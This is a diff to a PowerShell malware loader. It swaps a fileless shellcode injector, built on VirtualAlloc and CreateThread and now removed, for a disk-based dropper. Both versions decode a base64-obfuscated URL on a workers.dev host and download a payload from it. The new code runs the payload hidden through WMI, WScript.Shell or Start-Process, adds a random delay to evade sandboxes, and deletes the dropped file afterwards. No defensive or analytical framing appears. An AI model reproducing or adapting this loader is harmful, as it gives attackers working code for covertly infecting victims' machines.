@@ -78,43 +78,24 @@ if (-not $isFirstRun) {
 # === BEARFOOS EVASION: Delay before payload ===
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-# === FILELESS SHELLCODE INJECTION (WITH LOGGING) ===
-$logPath = "$env:TEMP\inject_log.txt"
-"Start: $(Get-Date)" | Out-File $logPath
-$shellcodeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl'))
+# === DOWNLOAD AND EXECUTE PAYLOAD (DISK-BASED) ===
+$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl'))
+$exePath = "$cache\helper.exe"
 
-try {
-    "Downloading shellcode from $shellcodeUrl" | Out-File $logPath -Append
-    $sc = (New-Object Net.WebClient).DownloadData($shellcodeUrl)
-    "Downloaded $($sc.Length) bytes" | Out-File $logPath -Append
-    
-    "Compiling P/Invoke..." | Out-File $logPath -Append
-    $k32 = Add-Type -MemberDefinition @"
-[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
-[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
-[DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
-"@ -Name 'K32' -Namespace 'Win32' -PassThru
-    "P/Invoke compiled" | Out-File $logPath -Append
-    
-    "Allocating memory..." | Out-File $logPath -Append
-    $addr = $k32::VirtualAlloc(0, [uint32]$sc.Length, 0x3000, 0x40)
-    "Memory allocated at: $addr" | Out-File $logPath -Append
-    
-    "Copying shellcode..." | Out-File $logPath -Append
-    [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
-    
-    "Creating thread..." | Out-File $logPath -Append
-    $thread = $k32::CreateThread(0, 0, $addr, 0, 0, 0)
-    "Thread handle: $thread" | Out-File $logPath -Append
-    
-    "Injection complete" | Out-File $logPath -Append
-} catch {
-    "ERROR: $_" | Out-File $logPath -Append
-    # Fallback: Write to disk
-    $fallbackPath = "$cache\helper.exe"
-    [System.IO.File]::WriteAllBytes($fallbackPath, $sc)
-    Start-Process $fallbackPath -WindowStyle Hidden
-    "Fallback executed: $fallbackPath" | Out-File $logPath -Append
+if (-not (Test-Path $exePath)) {
+    $retryCount = 0; $maxRetries = 3
+    do {
+        try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing; break } catch { $retryCount++; Start-Sleep -Seconds 5 }
+    } while ($retryCount -lt $maxRetries)
 }
-# === CLEANUP (PDF only) ===
-Start-Job -ScriptBlock { param($pdf) Start-Sleep -Seconds 300; Remove-Item $pdf -Force -ErrorAction SilentlyContinue } -ArgumentList $pdfPath | Out-Null
+
+if (Test-Path $exePath) {
+    try {
+        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
+    } catch {
+        try { (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) } catch { Start-Process $exePath -WindowStyle Hidden }
+    }
+}
+
+# === CLEANUP ===
+Start-Job -ScriptBlock { param($exe) Start-Sleep -Seconds 300; Remove-Item $exe -Force -ErrorAction SilentlyContinue } -ArgumentList $exePath | Out-Null
